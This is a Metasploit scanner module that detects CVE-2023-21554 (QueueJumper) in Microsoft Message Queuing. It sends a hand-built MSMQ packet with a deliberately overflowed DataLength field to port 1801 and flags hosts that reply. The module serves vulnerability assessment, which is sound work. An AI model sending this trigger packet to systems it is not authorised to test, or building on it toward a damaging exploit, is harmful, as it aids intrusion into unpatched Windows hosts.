##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2023-21554 - QueueJumper - MSMQ RCE Check',
        'Description' => %q{
          This module checks the provided hosts for the CVE-2023-21554 vulnerability by sending
          a MSMQ message with an altered DataLength field within the SRMPEnvelopeHeader that
          overflows the given buffer. On patched systems, the error is catched and no response
          is sent back. On vulnerable systems, the integer wraps around and depending on the length
          could cause an out-of-bounds write. In the context of this module a response is sent back,
          which indicates that the system is vulnerable.
        },
        'Author' => [
          'Wayne Low', # Vulnerability discovery
          'Haifei Li', # Vulnerability discovery
          'Bastian Kanbach <bastian.kanbach@securesystems.de>' # Metasploit Module, @__bka__
        ],
        'References' => [
          [ 'CVE', '2023-21554' ],
          [ 'URL', 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21554' ],
          [ 'URL', 'https://securityintelligence.com/posts/msmq-queuejumper-rce-vulnerability-technical-analysis/' ]
        ],
        'DisclosureDate' => '2023-04-11',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION],
          'AKA' => ['QueueJumper']
        }
      )
    )
    register_options([
      Opt::RPORT(1801)
    ])
  end

  # Preparing message struct according to https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/f9e71595-339a-4cc4-8341-371e0a4cb232

  def base_header
    # BaseHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/058cdeb4-7a3c-405b-989c-d32b9d6bddae)
    #
    # Simple header containing a static signature, packet size, some flags and some sort of timeout value for the message to arrive
    #
    # Fields: VersionNumber(1), Reserved(1), Flags(2), Signature(4), PacketSize(4), TimeToReachQueue(4)

    "\x10\x00\x03\x10\x4c\x49\x4f\x52\x64\x09\x00\x00\x63\x76\x09\x6c"
  end

  def user_header
    # UserHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/056b43bc-2466-4342-8504-1630310d5965)
    #
    # The UserHeader is an essential header that defines the destination, message id,
    # source, sent time and expiration time
    #
    # Fields: SourceQueueManager(16), QueueManagerAddress(16), TimeToBeReceived(4), SentTime(4),
    #         MessageID(4), Flags(4), DestinationQueue(16),  DestinationQueue(2), Padding(2)

    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x63\xaa\xbe\x64\x01\x00\x00\x00\x01\x1c\x20\x02" \
    "\x60\x00\x68\x00\x74\x00\x74\x00\x70\x00\x3a\x00\x2f\x00\x2f\x00" \
    "\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00" \
    "\x35\x00\x36\x00\x2e\x00\x31\x00\x31\x00\x33\x00\x2f\x00\x6d\x00" \
    "\x73\x00\x6d\x00\x71\x00\x2f\x00\x70\x00\x72\x00\x69\x00\x76\x00" \
    "\x61\x00\x74\x00\x65\x00\x24\x00\x2f\x00\x71\x00\x75\x00\x65\x00" \
    "\x75\x00\x65\x00\x6a\x00\x75\x00\x6d\x00\x70\x00\x65\x00\x72\x00" \
    "\x00\x00\x00\x00"
  end

  def message_properties_header
    # MessagePropertiesHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqmq/b219bdf4-1bf6-4688-94d8-25fdba45e5ec)
    #
    # This header contains meta information about the message like its label,
    # message size and whether encryption is used.
    #
    # Fields: Flags(1), LabelLength(1), MessageClass(2), CorrelationID(8), CorrelationID(12),
    #         BodyType(4), ApplicationTag(4), MessageSize(4), AllocationBodySize(4), PrivacyLevel(4),
    #         HashAlgorithm(4), EncryptionAlgorithm(4), ExtensionSize(4), Label (8)

    "\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x6f\x00\x63\x00\x00\x00"
  end

  def srmp_envelope_header
    # SRMPEnvelopeHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/062b8317-2ade-4b1c-804d-1674b2fdcad3)
    #
    # This header contains information about the SOAP envelope of the message.
    # It includes information about destination queue, label, message and sent
    # or expiration dates.
    # The Data field contains a SRMP Message Structure (https://learn.microsoft.com/en-us/openspecs/windows_protocols/mc-mqsrm/38cfc717-c703-46aa-a145-34f60b79399b)
    # The DataLength field is modified by this module to cause an integer overflow,
    # however the module makes sure that in case of a vulnerable system the
    # resulting length is identical to the previous one to prevent actual crashes.
    #
    # Fields: HeaderId(2), Reserved(2), Datalength(4), Data(1078), Padding(2)

    "\x00\x00\x00\x00\x1b\x02\x00\x00\x3c\x00\x73\x00\x65\x00\x3a\x00" \
    "\x45\x00\x6e\x00\x76\x00\x65\x00\x6c\x00\x6f\x00\x70\x00\x65\x00" \
    "\x20\x00\x78\x00\x6d\x00\x6c\x00\x6e\x00\x73\x00\x3a\x00\x73\x00" \
    "\x65\x00\x3d\x00\x22\x00\x68\x00\x74\x00\x74\x00\x70\x00\x3a\x00" \
    "\x2f\x00\x2f\x00\x73\x00\x63\x00\x68\x00\x65\x00\x6d\x00\x61\x00" \
    "\x73\x00\x2e\x00\x78\x00\x6d\x00\x6c\x00\x73\x00\x6f\x00\x61\x00" \
    "\x70\x00\x2e\x00\x6f\x00\x72\x00\x67\x00\x2f\x00\x73\x00\x6f\x00" \
    "\x61\x00\x70\x00\x2f\x00\x65\x00\x6e\x00\x76\x00\x65\x00\x6c\x00" \
    "\x6f\x00\x70\x00\x65\x00\x2f\x00\x22\x00\x20\x00\x0d\x00\x0a\x00" \
    "\x78\x00\x6d\x00\x6c\x00\x6e\x00\x73\x00\x3d\x00\x22\x00\x68\x00" \
    "\x74\x00\x74\x00\x70\x00\x3a\x00\x2f\x00\x2f\x00\x73\x00\x63\x00" \
    "\x68\x00\x65\x00\x6d\x00\x61\x00\x73\x00\x2e\x00\x78\x00\x6d\x00" \
    "\x6c\x00\x73\x00\x6f\x00\x61\x00\x70\x00\x2e\x00\x6f\x00\x72\x00" \
    "\x67\x00\x2f\x00\x73\x00\x72\x00\x6d\x00\x70\x00\x2f\x00\x22\x00" \
    "\x3e\x00\x0d\x00\x0a\x00\x3c\x00\x73\x00\x65\x00\x3a\x00\x48\x00" \
    "\x65\x00\x61\x00\x64\x00\x65\x00\x72\x00\x3e\x00\x0d\x00\x0a\x00" \
    "\x20\x00\x3c\x00\x70\x00\x61\x00\x74\x00\x68\x00\x20\x00\x78\x00" \
    "\x6d\x00\x6c\x00\x6e\x00\x73\x00\x3d\x00\x22\x00\x68\x00\x74\x00" \
    "\x74\x00\x70\x00\x3a\x00\x2f\x00\x2f\x00\x73\x00\x63\x00\x68\x00" \
    "\x65\x00\x6d\x00\x61\x00\x73\x00\x2e\x00\x78\x00\x6d\x00\x6c\x00" \
    "\x73\x00\x6f\x00\x61\x00\x70\x00\x2e\x00\x6f\x00\x72\x00\x67\x00" \
    "\x2f\x00\x72\x00\x70\x00\x2f\x00\x22\x00\x20\x00\x73\x00\x65\x00" \
    "\x3a\x00\x6d\x00\x75\x00\x73\x00\x74\x00\x55\x00\x6e\x00\x64\x00" \
    "\x65\x00\x72\x00\x73\x00\x74\x00\x61\x00\x6e\x00\x64\x00\x3d\x00" \
    "\x22\x00\x31\x00\x22\x00\x3e\x00\x0d\x00\x0a\x00\x20\x00\x20\x00" \
    "\x20\x00\x3c\x00\x61\x00\x63\x00\x74\x00\x69\x00\x6f\x00\x6e\x00" \
    "\x3e\x00\x4d\x00\x53\x00\x4d\x00\x51\x00\x3a\x00\x70\x00\x6f\x00" \
    "\x63\x00\x3c\x00\x2f\x00\x61\x00\x63\x00\x74\x00\x69\x00\x6f\x00" \
    "\x6e\x00\x3e\x00\x0d\x00\x0a\x00\x20\x00\x20\x00\x20\x00\x3c\x00" \
    "\x74\x00\x6f\x00\x3e\x00\x68\x00\x74\x00\x74\x00\x70\x00\x3a\x00" \
    "\x2f\x00\x2f\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00" \
    "\x38\x00\x2e\x00\x35\x00\x36\x00\x2e\x00\x31\x00\x31\x00\x33\x00" \
    "\x2f\x00\x6d\x00\x73\x00\x6d\x00\x71\x00\x2f\x00\x70\x00\x72\x00" \
    "\x69\x00\x76\x00\x61\x00\x74\x00\x65\x00\x24\x00\x2f\x00\x71\x00" \
    "\x75\x00\x65\x00\x75\x00\x65\x00\x6a\x00\x75\x00\x6d\x00\x70\x00" \
    "\x65\x00\x72\x00\x3c\x00\x2f\x00\x74\x00\x6f\x00\x3e\x00\x0d\x00" \
    "\x0a\x00\x20\x00\x20\x00\x20\x00\x3c\x00\x69\x00\x64\x00\x3e\x00" \
    "\x75\x00\x75\x00\x69\x00\x64\x00\x3a\x00\x31\x00\x40\x00\x30\x00" \
    "\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x2d\x00" \
    "\x30\x00\x30\x00\x30\x00\x30\x00\x2d\x00\x30\x00\x30\x00\x30\x00" \
    "\x30\x00\x2d\x00\x30\x00\x30\x00\x30\x00\x30\x00\x2d\x00\x30\x00" \
    "\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00\x30\x00" \
    "\x30\x00\x30\x00\x30\x00\x3c\x00\x2f\x00\x69\x00\x64\x00\x3e\x00" \
    "\x0d\x00\x0a\x00\x20\x00\x3c\x00\x2f\x00\x70\x00\x61\x00\x74\x00" \
    "\x68\x00\x3e\x00\x0d\x00\x0a\x00\x20\x00\x3c\x00\x70\x00\x72\x00" \
    "\x6f\x00\x70\x00\x65\x00\x72\x00\x74\x00\x69\x00\x65\x00\x73\x00" \
    "\x20\x00\x73\x00\x65\x00\x3a\x00\x6d\x00\x75\x00\x73\x00\x74\x00" \
    "\x55\x00\x6e\x00\x64\x00\x65\x00\x72\x00\x73\x00\x74\x00\x61\x00" \
    "\x6e\x00\x64\x00\x3d\x00\x22\x00\x31\x00\x22\x00\x3e\x00\x0d\x00" \
    "\x0a\x00\x20\x00\x20\x00\x20\x00\x3c\x00\x65\x00\x78\x00\x70\x00" \
    "\x69\x00\x72\x00\x65\x00\x73\x00\x41\x00\x74\x00\x3e\x00\x32\x00" \
    "\x30\x00\x32\x00\x37\x00\x30\x00\x36\x00\x30\x00\x39\x00\x54\x00" \
    "\x31\x00\x36\x00\x34\x00\x34\x00\x31\x00\x39\x00\x3c\x00\x2f\x00" \
    "\x65\x00\x78\x00\x70\x00\x69\x00\x72\x00\x65\x00\x73\x00\x41\x00" \
    "\x74\x00\x3e\x00\x0d\x00\x0a\x00\x20\x00\x20\x00\x20\x00\x3c\x00" \
    "\x73\x00\x65\x00\x6e\x00\x74\x00\x41\x00\x74\x00\x3e\x00\x32\x00" \
    "\x30\x00\x32\x00\x33\x00\x30\x00\x37\x00\x32\x00\x34\x00\x54\x00" \
    "\x31\x00\x36\x00\x34\x00\x34\x00\x31\x00\x39\x00\x3c\x00\x2f\x00" \
    "\x73\x00\x65\x00\x6e\x00\x74\x00\x41\x00\x74\x00\x3e\x00\x0d\x00" \
    "\x0a\x00\x20\x00\x3c\x00\x2f\x00\x70\x00\x72\x00\x6f\x00\x70\x00" \
    "\x65\x00\x72\x00\x74\x00\x69\x00\x65\x00\x73\x00\x3e\x00\x0d\x00" \
    "\x0a\x00\x3c\x00\x2f\x00\x73\x00\x65\x00\x3a\x00\x48\x00\x65\x00" \
    "\x61\x00\x64\x00\x65\x00\x72\x00\x3e\x00\x0d\x00\x0a\x00\x3c\x00" \
    "\x73\x00\x65\x00\x3a\x00\x42\x00\x6f\x00\x64\x00\x79\x00\x3e\x00" \
    "\x3c\x00\x2f\x00\x73\x00\x65\x00\x3a\x00\x42\x00\x6f\x00\x64\x00" \
    "\x79\x00\x3e\x00\x0d\x00\x0a\x00\x3c\x00\x2f\x00\x73\x00\x65\x00" \
    "\x3a\x00\x45\x00\x6e\x00\x76\x00\x65\x00\x6c\x00\x6f\x00\x70\x00" \
    "\x65\x00\x3e\x00\x0d\x00\x0a\x00\x0d\x00\x0a\x00\x00\x00\x64\x00"
  end

  def compound_message_header
    # CompoundMessageHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/ecf70c09-d312-4afc-9e2c-f61a5c827f47)
    #
    # This header contains information about the SRMP compound message.
    # This is basically a HTTP message containing HTTP headers and a SOAP
    # body that defines parameters like the message destination, sent date,
    # label and some more.
    #
    # Fields:
    #   HeaderId(2), Reserved(2), HTTPBodySize(4), MsgBodySize(4), MsgBodyOffset(4), Data(1060)

    "\xf4\x01\x00\x00\x24\x04\x00\x00\x07\x00\x00\x00\xe3\x03\x00\x00" \
    "\x50\x4f\x53\x54\x20\x2f\x6d\x73\x6d\x71\x20\x48\x54\x54\x50\x2f" \
    "\x31\x2e\x31\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e" \
    "\x67\x74\x68\x3a\x20\x38\x31\x36\x0d\x0a\x43\x6f\x6e\x74\x65\x6e" \
    "\x74\x2d\x54\x79\x70\x65\x3a\x20\x6d\x75\x6c\x74\x69\x70\x61\x72" \
    "\x74\x2f\x72\x65\x6c\x61\x74\x65\x64\x3b\x20\x62\x6f\x75\x6e\x64" \
    "\x61\x72\x79\x3d\x22\x4d\x53\x4d\x51\x20\x2d\x20\x53\x4f\x41\x50" \
    "\x20\x62\x6f\x75\x6e\x64\x61\x72\x79\x2c\x20\x35\x33\x32\x38\x37" \
    "\x22\x3b\x20\x74\x79\x70\x65\x3d\x74\x65\x78\x74\x2f\x78\x6d\x6c" \
    "\x0d\x0a\x48\x6f\x73\x74\x3a\x20\x31\x39\x32\x2e\x31\x36\x38\x2e" \
    "\x35\x36\x2e\x31\x31\x33\x0d\x0a\x53\x4f\x41\x50\x41\x63\x74\x69" \
    "\x6f\x6e\x3a\x20\x22\x4d\x53\x4d\x51\x4d\x65\x73\x73\x61\x67\x65" \
    "\x22\x0d\x0a\x50\x72\x6f\x78\x79\x2d\x41\x63\x63\x65\x70\x74\x3a" \
    "\x20\x4e\x6f\x6e\x49\x6e\x74\x65\x72\x61\x63\x74\x69\x76\x65\x43" \
    "\x6c\x69\x65\x6e\x74\x0d\x0a\x0d\x0a\x2d\x2d\x4d\x53\x4d\x51\x20" \
    "\x2d\x20\x53\x4f\x41\x50\x20\x62\x6f\x75\x6e\x64\x61\x72\x79\x2c" \
    "\x20\x35\x33\x32\x38\x37\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d" \
    "\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x78\x6d\x6c\x3b\x20" \
    "\x63\x68\x61\x72\x73\x65\x74\x3d\x55\x54\x46\x2d\x38\x0d\x0a\x43" \
    "\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x36" \
    "\x30\x36\x0d\x0a\x0d\x0a\x3c\x73\x65\x3a\x45\x6e\x76\x65\x6c\x6f" \
    "\x70\x65\x20\x78\x6d\x6c\x6e\x73\x3a\x73\x65\x3d\x22\x68\x74\x74" \
    "\x70\x3a\x2f\x2f\x73\x63\x68\x65\x6d\x61\x73\x2e\x78\x6d\x6c\x73" \
    "\x6f\x61\x70\x2e\x6f\x72\x67\x2f\x73\x6f\x61\x70\x2f\x65\x6e\x76" \
    "\x65\x6c\x6f\x70\x65\x2f\x22\x20\x0d\x0a\x78\x6d\x6c\x6e\x73\x3d" \
    "\x22\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x68\x65\x6d\x61\x73\x2e" \
    "\x78\x6d\x6c\x73\x6f\x61\x70\x2e\x6f\x72\x67\x2f\x73\x72\x6d\x70" \
    "\x2f\x22\x3e\x0d\x0a\x3c\x73\x65\x3a\x48\x65\x61\x64\x65\x72\x3e" \
    "\x0d\x0a\x20\x3c\x70\x61\x74\x68\x20\x78\x6d\x6c\x6e\x73\x3d\x22" \
    "\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x68\x65\x6d\x61\x73\x2e\x78" \
    "\x6d\x6c\x73\x6f\x61\x70\x2e\x6f\x72\x67\x2f\x72\x70\x2f\x22\x20" \
    "\x73\x65\x3a\x6d\x75\x73\x74\x55\x6e\x64\x65\x72\x73\x74\x61\x6e" \
    "\x64\x3d\x22\x31\x22\x3e\x0d\x0a\x20\x20\x20\x3c\x61\x63\x74\x69" \
    "\x6f\x6e\x3e\x4d\x53\x4d\x51\x3a\x70\x6f\x63\x3c\x2f\x61\x63\x74" \
    "\x69\x6f\x6e\x3e\x0d\x0a\x20\x20\x20\x3c\x74\x6f\x3e\x68\x74\x74" \
    "\x70\x3a\x2f\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x35\x36\x2e\x31" \
    "\x31\x33\x2f\x6d\x73\x6d\x71\x2f\x70\x72\x69\x76\x61\x74\x65\x24" \
    "\x2f\x71\x75\x65\x75\x65\x6a\x75\x6d\x70\x65\x72\x3c\x2f\x74\x6f" \
    "\x3e\x0d\x0a\x20\x20\x20\x3c\x69\x64\x3e\x75\x75\x69\x64\x3a\x31" \
    "\x40\x30\x30\x30\x30\x30\x30\x30\x30\x2d\x30\x30\x30\x30\x2d\x30" \
    "\x30\x30\x30\x2d\x30\x30\x30\x30\x2d\x30\x30\x30\x30\x30\x30\x30" \
    "\x30\x30\x30\x30\x30\x3c\x2f\x69\x64\x3e\x0d\x0a\x20\x3c\x2f\x70" \
    "\x61\x74\x68\x3e\x0d\x0a\x20\x3c\x70\x72\x6f\x70\x65\x72\x74\x69" \
    "\x65\x73\x20\x73\x65\x3a\x6d\x75\x73\x74\x55\x6e\x64\x65\x72\x73" \
    "\x74\x61\x6e\x64\x3d\x22\x31\x22\x3e\x0d\x0a\x20\x20\x20\x3c\x65" \
    "\x78\x70\x69\x72\x65\x73\x41\x74\x3e\x32\x30\x32\x37\x30\x36\x30" \
    "\x39\x54\x31\x36\x34\x34\x31\x39\x3c\x2f\x65\x78\x70\x69\x72\x65" \
    "\x73\x41\x74\x3e\x0d\x0a\x20\x20\x20\x3c\x73\x65\x6e\x74\x41\x74" \
    "\x3e\x32\x30\x32\x33\x30\x37\x32\x34\x54\x31\x36\x34\x34\x31\x39" \
    "\x3c\x2f\x73\x65\x6e\x74\x41\x74\x3e\x0d\x0a\x20\x3c\x2f\x70\x72" \
    "\x6f\x70\x65\x72\x74\x69\x65\x73\x3e\x0d\x0a\x3c\x2f\x73\x65\x3a" \
    "\x48\x65\x61\x64\x65\x72\x3e\x0d\x0a\x3c\x73\x65\x3a\x42\x6f\x64" \
    "\x79\x3e\x3c\x2f\x73\x65\x3a\x42\x6f\x64\x79\x3e\x0d\x0a\x3c\x2f" \
    "\x73\x65\x3a\x45\x6e\x76\x65\x6c\x6f\x70\x65\x3e\x0d\x0a\x0d\x0a" \
    "\x2d\x2d\x4d\x53\x4d\x51\x20\x2d\x20\x53\x4f\x41\x50\x20\x62\x6f" \
    "\x75\x6e\x64\x61\x72\x79\x2c\x20\x35\x33\x32\x38\x37\x0d\x0a\x43" \
    "\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70" \
    "\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73" \
    "\x74\x72\x65\x61\x6d\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c" \
    "\x65\x6e\x67\x74\x68\x3a\x20\x37\x0d\x0a\x43\x6f\x6e\x74\x65\x6e" \
    "\x74\x2d\x49\x64\x3a\x20\x62\x6f\x64\x79\x40\x66\x66\x33\x61\x66" \
    "\x33\x30\x31\x2d\x33\x31\x39\x36\x2d\x34\x39\x37\x61\x2d\x61\x39" \
    "\x31\x38\x2d\x37\x32\x31\x34\x37\x63\x38\x37\x31\x61\x31\x33\x0d" \
    "\x0a\x0d\x0a\x4d\x65\x73\x73\x61\x67\x65\x0c\x00\x00\x00\x94\x00" \
    "\x00\x00\x02\x00\x00\x00\x94\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x53\x4f\x41" \
    "\x50\x20\x62\x6f\x75\x6e\x64\x61\x72\x79\x2c\x20\x35\x33\x32\x38" \
    "\x37\x2d\x2d\x00"
  end

  def extension_header
    #  ExtensionHeader (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqrr/baf230bf-7f15-4d03-bd1d-f8276608a955)
    #
    #  Header detailing if any further headers are present. In this case
    #  no further headers were appended.
    #
    #  Fields:
    #    HeaderSize(4), RemainingHeadersSize(4), Flags(1), Reserved(3)

    "\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  end

  def message_normal
    base_header + user_header + message_properties_header + srmp_envelope_header + compound_message_header + extension_header
  end

  def message_malformed
    base_header + user_header + message_properties_header + srmp_envelope_header[0..6] + "\x80" + srmp_envelope_header[8..] + compound_message_header + extension_header
  end

  def send_message(msg)
    connect
    sock.put(msg)
    response = sock.read(1024)
    disconnect
    return response
  end

  def run_host(ip)
    response = send_message(message_normal)

    if !response
      print_error('No response received due to a timeout')
      return
    end

    if response.include?('LIOR')
      print_status('MSMQ detected. Checking for CVE-2023-21554')
    else
      print_error('Service does not look like MSMQ')
      return
    end

    response = send_message(message_malformed)

    if response.nil?
      print_error('No response received, MSMQ seems to be patched')
      return
    end

    if response.include?('LIOR')
      print_good('MSMQ vulnerable to CVE-2023-21554 - QueueJumper!')

      # Add Report
      report_vuln(
        host: ip,
        port: rport,
        proto: 'tcp',
        name: name,
        info: 'Missing Microsoft Windows patch for CVE-2023-21554',
        refs: references
      )

    else
      print_error('Unknown response detected upon sending a malformed message. MSMQ might be vulnerable, but the behaviour is unusual')
    end
  rescue ::Rex::ConnectionError
    print_error('Unable to connect to the service')
  rescue ::Errno::EPIPE
    print_error('pipe error')
  rescue StandardError => e
    print_error(e)
  end
end
